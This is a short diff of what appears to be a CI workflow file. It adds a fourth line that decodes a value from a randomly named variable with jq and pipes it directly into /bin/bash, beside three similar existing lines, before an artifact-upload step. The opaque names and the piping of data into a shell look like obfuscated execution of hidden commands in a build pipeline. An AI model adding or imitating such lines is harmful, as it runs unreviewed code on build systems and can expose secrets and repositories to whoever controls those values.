@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$qfk26503" | jq -r .rjlza1 | /bin/bash
           echo $ifdx52902 | jq -r .fm4 | /bin/bash
           echo $dwukz479 | jq -r .aqcbr0 | /bin/bash
+          echo $flk8 | jq -r .upe121 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
